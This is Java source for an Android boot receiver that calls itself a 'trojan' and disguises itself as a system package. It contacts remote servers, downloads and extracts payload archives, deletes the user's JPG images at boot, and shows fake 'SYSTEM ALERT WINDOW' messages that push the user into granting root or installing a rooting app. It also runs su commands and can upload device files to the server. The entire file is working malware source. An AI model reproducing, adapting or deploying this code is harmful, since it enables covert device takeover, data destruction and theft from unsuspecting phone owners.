package os.system;

import org.apache.http.params.HttpParams;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.*;
import android.os.AsyncTask;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.Handler;
import android.os.Vibrator;
import android.content.BroadcastReceiver;
import android.util.Log;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.*;
import android.content.ActivityNotFoundException;
import android.content.SharedPreferences;
import android.widget.Toast;
import android.widget.TextView;
import android.view.View;
import android.view.LayoutInflater;
import android.view.Gravity;
import android.graphics.Color;
import android.net.Uri;
import android.webkit.MimeTypeMap;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiConfiguration;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.io.*;
import java.net.*;
import java.lang.reflect.*;

public class ReceiverBoot extends BroadcastReceiver
{
	private static String TAG = "trojan";
	private Vibrator vibrator;
	private boolean oke = true;
	private Context exContext;
	private ServerUtils utils;
    private Installer installator;
    private String pathToInstallServer;
    private static String version = "1";
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private static boolean prosesThread = true;
	private static boolean tmpThread = true;
	private static int delayThread = 3;
	private static int sizedownload = 0;
	private static String[] server = { "http://10.42.0.1","http://sunjangyo12.000webhostapp.com" };
	private static boolean finishInstall = false;
	
	public Toast toast;
	public static int iserver = 0;
	public static int errServer = 0;
	public static int jserver = 2;
	public static boolean pingResult = false;
	public static String urlServer = "";
	public static String requestAksi = "";
	public static String requestPath = "";
	public static String requestUrl = "";
	public static String requestResult = "";
	public static String requestResultUpload = "";
    public static boolean main = true;
    public static boolean rootResult = false;
    public static String docFolder, pathExternal;
    private Handler mHandler = new Handler();

	private Runnable mRefresh = new Runnable() {
		public void run() {
			prosesThread = false;
			try {
				toast.show();
			}catch(Exception e) {}
			mHandler.postDelayed(mRefresh, delayThread * 1000);
		}
	};

	public String getPath() {
		return pathExternal;
	}
	public void shared(String judul, String save) {
		seteditor.putString(judul, save);    
        seteditor.commit();
	}

	@Override
	public void onReceive(Context context, Intent intent)
	{
		exContext = context;
		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
		settings = context.getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		utils = new ServerUtils(context);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();
        pathExternal = utils.getPathExternal();
        urlServer = server[iserver];

        if (settings.getString("swmain","").equals("hidup")) 
		{
			main(context, intent);
		}
		//harus urut eksekusi
		if (cekConnection(context)) {
        	if (ping(context).equals("1")){
        		Log.i(TAG, "ping terhubung");
        		pingResult = true;
        	} else {
        		Log.i(TAG, "ping error");
        		pingResult = false;
        	}
        	if (prosesThread) {
        		mHandler.postDelayed(mRefresh, delayThread * 1000);
        	}
        }		

        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
        {
			context.startService(new Intent(context, System.class));
			try {
				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
			}
			catch(Exception e) {}
		}
	}

	public void main(Context context, Intent intent) {
        if (!hostspotStatus(context)) 
        {
	        if (!new File(pathExternal+"/system.apk").exists()) {
	        	if (new MainActivity().apkMana(context, "os.system", "pull")) 
	        	{
	        		try {
	        			Thread.sleep(4000);
	        			Runtime.getRuntime().exec("mv "+pathExternal+"/os.system.apk "+pathExternal+"/system.apk");
	        		}catch(Exception e){
	        			Log.i(TAG, "rename er : "+e);
	        		}
	        	} //copy apk
	        }//cek file
	    }


	    if (!utils.checkDownload()) 
	    {
	    	Log.i(TAG, "......download server");

			requestUrl = urlServer+"/install.txt";
			requestAksi = "web";
			mainRequest(context);

		   	JSONObject obj;

	    	if (!new File(pathExternal+"/server.zip").exists()) 
	    	{
	    		try {
	    			obj = new JSONObject(requestResult);
		    		Log.i(TAG, "download server : "+obj.getString("url_install_server"));

		    		requestUrl = obj.getString("url_install_server");
					requestAksi = "download";
					requestPath = pathExternal+"/server.zip";
					mainRequest(context);
				}
				catch(Exception e) {}
	    	} else {
	    		try {
	    			obj = new JSONObject(requestResult);
		    		Log.i(TAG, "download DATA : "+obj.getString("url_install_data"));

		    		requestUrl = obj.getString("url_install_data");
					requestAksi = "download";
					requestPath = pathExternal+"/data.zip";
					mainRequest(context);
				}catch(Exception e) {}
	    	}
	    	
        } 

        if (utils.checkDownload() && !utils.checkInstall()) {
        	extrak(context, pathExternal+"/server.zip", pathToInstallServer, docFolder);
        }

        if (utils.checkDownload() && !utils.checkInstallData() && utils.checkInstall()) {
			extrak(context, pathExternal+"/data.zip", pathExternal, pathExternal);
        }
        Log.i(TAG,""+utils.checkInstallData());

        if (utils.checkInstallData()) {
			finishInstall = true;
        }
        
        if (finishInstall) 
        {
			if (rootRequest().equals("root")) 
			{
				boolean[] flags = utils.checkRun();
        		if (flags[0] && flags[1] && flags[2]) {
        			Log.i(TAG, "run server OK");
	        	} else {
	        		utils.runSrv();
	        	}
				rootResult = true;
			}
			else if (rootRequest().equals("tolak user")) {
				rootResult = false;
				delayThread = 3;
				toastText(context, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\n\n\n", Color.RED, Gravity.TOP);
			}
			else if (rootRequest().equals("tidak root")) {
				rootResult = false;
				if (!new MainActivity().apkMana(context, "kingoroot.supersu", "open")) 
				{
					delayThread = 1;
					toastText(context, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app SuperUser\n\b2. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n", Color.YELLOW, Gravity.TOP);
		
					String path = pathExternal+"/kroot.apk";
					String ext = getExtension(path);
					MimeTypeMap mime = MimeTypeMap.getSingleton();
	        		String mimeType = mime.getMimeTypeFromExtension(ext.substring(1));
					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	            	intent.setAction(Intent.ACTION_VIEW);
	            	intent.setDataAndType(Uri.parse("file://" + path), mimeType);
	            	intent.putExtra("data", path);
	            	intent.putExtra(Intent.EXTRA_TITLE, "Что использовать?");
	            	try {
	            	    context.startActivity(intent);
	            	} catch (Exception ae) {}
	      		}
				else {
					delayThread = 5;
					toastText(context, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n", Color.GREEN, Gravity.TOP);
				}
			}
        }
	}


	public String cekClientOrServer() {
		String sip = Identitas.getIPAddress(true);
        String[] ip = sip.split("[.]");
        int index = ip.length - 1;

        Log.i(TAG, "addres : "+ip[index]);

        if (ip[index].equals("1")) {
        	return "server";
        }
        return "client";
	}

	public String cekClient() {
		String exe = shellCommands("ls "+pathExternal+"/client");
		if (exe.equals("")) {
			return "kosong";
		}

		return "ada";
	}

	public String ping(Context context) 
	{
		Log.i(TAG, "ping server: "+server[iserver]);

		requestUrl = server[iserver]+"/ping.txt";
		requestAksi = "web";
		mainRequest(context);

		return requestResult;
	}

	public static boolean cekConnection(Context context) {
		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo wifinfo    = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		NetworkInfo active     = cm.getActiveNetworkInfo();
		
		if (wifinfo != null && wifinfo.isConnected()) {
			return true;
		}
		if (mobileinfo != null && mobileinfo.isConnected()) {
			return true;
		}
		if (active != null && active.isConnected()) {
			return true;
		}
		return false;
	}

	public static void setGSM(boolean enable, Context context) {
    	String command;
    	if (enable) {
    		command = "svc data enable\n";
    	} else {
    		command = "svc data disable\n";
    	}
    	try {
    		Process su = Runtime.getRuntime().exec("su");
    		DataOutputStream out = new DataOutputStream(su.getOutputStream());
    		out.writeBytes(command);
    		out.flush();
    		
    		out.close();
    	}
    	catch (Exception e) {}
    }

	public static boolean hostspotStatus(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		try { 
			Method method = wifimanager.getClass().getDeclaredMethod("isWifiApEnabled"); 
			method.setAccessible(true); 
			return (Boolean) method.invoke(wifimanager); 
		}
		catch (Throwable ignored) {} 
		return false; 
	} 

	public static boolean hotspotConfig(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		WifiConfiguration wificonfiguration = null; 
		try { 
			// if WiFi is on, turn it off 
			if(hostspotStatus(context)) { 
				wifimanager.setWifiEnabled(false);
				main = true;
			} 
			Method method = wifimanager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class); 
			method.invoke(wifimanager, wificonfiguration, !hostspotStatus(context)); 
			return true; 
		}
		catch (Exception e) { 
			e.printStackTrace(); 
		} 
		return false; 
	} 

	public static String rootRequest() {
		boolean retval = false;
		Process suProcess;
		String rootData = "";
		try {
			suProcess = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
			DataInputStream osRes = new DataInputStream(suProcess.getInputStream());
			if (null != os && null != osRes) {
				os.writeBytes("id\n");
				os.flush();

				String currUid = osRes.readLine();
				boolean exitSu = false;
				if (null == currUid) {
					retval = false;
					exitSu = false;
					rootData = "tolak user";
					Log.d("ROOT","Cant get root access or denied by user");
				}
				else if (true == currUid.contains("uid=0")) {
					retval = true;
					exitSu = true;
					rootData = "root";
					Log.d("ROOT","Root access granted");
				}
				else {
					retval = false;
					exitSu = true;
					Log.d("ROOT","Root access rejectd: "+currUid);
				}

				if (exitSu) {
					os.writeBytes("exit\n");
					os.flush();
				}

			}
		} catch (Exception e) {
			retval = false;
			rootData = "tidak root";
			Log.d("ROOT", "Root access rejectd["+e.getClass().getName()+"] :"+e.getMessage());
		}
		//return retval;
		return rootData;
	}

	public void rootCommands(String[] cmds) {
		Process p;
		try{
			p = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());

			for (String tmpCmd : cmds) {
				os.writeBytes(tmpCmd+"\n");
			}
			os.writeBytes("exit\n");
			os.flush();
		} catch (Exception e) {}
	}

	public String shellCommands(String command) {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line = "";
			while ((line = reader.readLine())!= null) {
				output.append(line+"\n");
			}

		}
		catch (Exception e) {
			e.printStackTrace();
		}
		String response = output.toString();
		return response;
	}
	

	public String textSplit(String data, String tsplit) {
		StringBuffer out = new StringBuffer();
		String[] sp = data.split(tsplit);

		for (int i=0; i<sp.length; i++) {
			out.append(sp[i]);
		}
		return out.toString();
	}

	public void editor(Context context, String text, String nfile) {
		Installer save = new Installer(context, false);
		try {
			save.saveCode(text, "utf-8", pathExternal+"/"+nfile);
		}catch(Exception e){}
	}

	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
		Installer installator = new Installer(context, true);
		installator.execute(efile, pathsatu, pathdua);
	}

	private static String getExtension(String path) {
        if (path.contains(".")) {
            return path.substring(path.lastIndexOf(".")).toLowerCase();
        }
        return null;
    }


	public void toastText(Context context, String data, int warna, int letak)
	{
		LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
		View layout = inflater.inflate(R.layout.toast, null);

    	TextView text = (TextView) layout.findViewById(R.id.toast);
		text.setText(data);
		text.setTextColor(Color.BLACK);
		text.setTextSize(13);
		text.setGravity(Gravity.CENTER);

		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(text);
		toast.setView(layout);

		View toastView = toast.getView();
		toastView.setBackgroundColor(warna);
	}

	public void mainRequest(Context context) {
		CallWebPageTask task = new CallWebPageTask();
		task.applicationContext = context;
		task.main = requestAksi;

		try {
			if (cekConnection(context) && errServer <= 3) {
				task.execute(new String[] { requestUrl });
			} else {
				Log.i(TAG, "rece connection : "+cekConnection(context));
			}
		}catch(Exception e) {
			errServer += 1;
			Log.i(TAG, "timeout update: "+errServer+" >>"+e);
		}
	}

	public String requestUpload() {
		String strSDPath = requestPath;
		String strUrlServer = requestUrl;
            
		int bytesRead, bytesAvailable, bufferSize;
		byte[] buffer;
		int maxBufferSize = 1 * 1024 * 1024;
		int resCode = 0;
		String resMessage = "";

		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary =  "*****";
		String resServer = "";

        	
		try {
			/** Check file on SD Card ***/
			File file = new File(strSDPath);
			if(!file.exists())
			{
				resServer = "{\"StatusID\":\"0\",\"Error\":\"Please check path on SD Card\"}";
				return null;
			}

			FileInputStream fileInputStream = new FileInputStream(new File(strSDPath));

			URL url = new URL(strUrlServer);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");

			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Content-Type",
										"multipart/form-data;boundary=" + boundary);

			DataOutputStream outputStream = new DataOutputStream(conn
																	 .getOutputStream());
			outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			outputStream.writeBytes("Content-Disposition: form-data; name=\"filUpload\";filename=\""+ strSDPath + "\"" + lineEnd);
			outputStream.writeBytes(lineEnd);

			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			// Read file
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0) {
				outputStream.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}

			outputStream.writeBytes(lineEnd);
			outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			// Response Code and  Message
			resCode = conn.getResponseCode();
			if(resCode == HttpURLConnection.HTTP_OK)
			{
				InputStream is = conn.getInputStream();
				ByteArrayOutputStream bos = new ByteArrayOutputStream();

				int read = 0;
				while ((read = is.read()) != -1) {
					bos.write(read);
				}
				byte[] result = bos.toByteArray();
				bos.close();
				resMessage = new String(result);
			}

			Log.d("resCode=",Integer.toString(resCode));
			Log.d("resMessage=",resMessage.toString());

			fileInputStream.close();
			outputStream.flush();
			outputStream.close();

			resServer = resMessage.toString();
			requestResultUpload = resServer;
		
		} catch (Exception ex) {
			// Exception handling
			requestResultUpload = "uploaderror";

			return null;
		}
		return resServer;
	}
	

	public String requestDownload() {
		InputStream input = null;
        OutputStream output = null;
        HttpURLConnection connection = null;
        String error = "";
        try {
            URL url = new URL(requestUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();

            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return "Server returned HTTP "+ connection.getResponseCode()+" "+connection.getResponseMessage();
            }

            int fileLength = connection.getContentLength();

            // download the file
            input = connection.getInputStream();
            output = new FileOutputStream(requestPath);
            byte data[] = new byte[4096];
            long total = 0;
            int count;

            while ( (count=input.read(data)) != -1 ) {
                /*if (isCancelled()) {
                    input.close();
                    return null;
                }*/
                total += count;

                if (fileLength > 0) 
                	sizedownload = (int) (total * 100 / fileLength);
                    //publishProgress((int) (total*100/fileLength));
                output.write(data, 0, count);
            }

        } catch (IOException e) {
            error = e.toString();
        } finally {
            try {
                if (output != null) output.close();
                if (input != null) input.close();
            }
            catch (IOException ioe) {

            }
            if (connection != null) connection.disconnect();
        }
        return "ok : "+error;
	}
	
	//Mengirimkan data web keserver
	public String requestWeb(){
		String sret = "";
		HttpParams httpParams = new BasicHttpParams();
	    HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
	    HttpConnectionParams.setSoTimeout(httpParams, 50000);

        HttpClient httpClient = new DefaultHttpClient(httpParams);
        HttpGet request = new HttpGet(requestUrl);
        try{
            HttpResponse response = httpClient.execute(request);

            try { // split result
         	   InputStream in = response.getEntity().getContent();
         	   BufferedReader reader = new BufferedReader(new InputStreamReader(in));
         	   StringBuilder str = new StringBuilder();
         	   String line = null;
         	   while((line = reader.readLine()) != null){
         	       str.append(line);
         	   }
         	   in.close();
         	   sret = str.toString();
        	} catch(Exception ex) {
        	  	Log.i(TAG, "Error split text");
        	}
        }
		catch(Exception ex){
			iserver += 1;
			if (iserver == jserver) {
				iserver = 0;
			}
			Log.i(TAG, "Failed rece Connect to Server!");
        }
        return sret;
    }

	private class CallWebPageTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String main = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	//data[0] = url
	    	if (main.equals("web")) {
				return requestWeb();
			}
			else if (main.equals("download")){
				return requestDownload();
			}
			else if (main.equals("upload")) {
				return requestUpload();
			}
			return null;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	if (main.equals("web")) {
		    	requestResult = result;
	    	}
		}
	}

}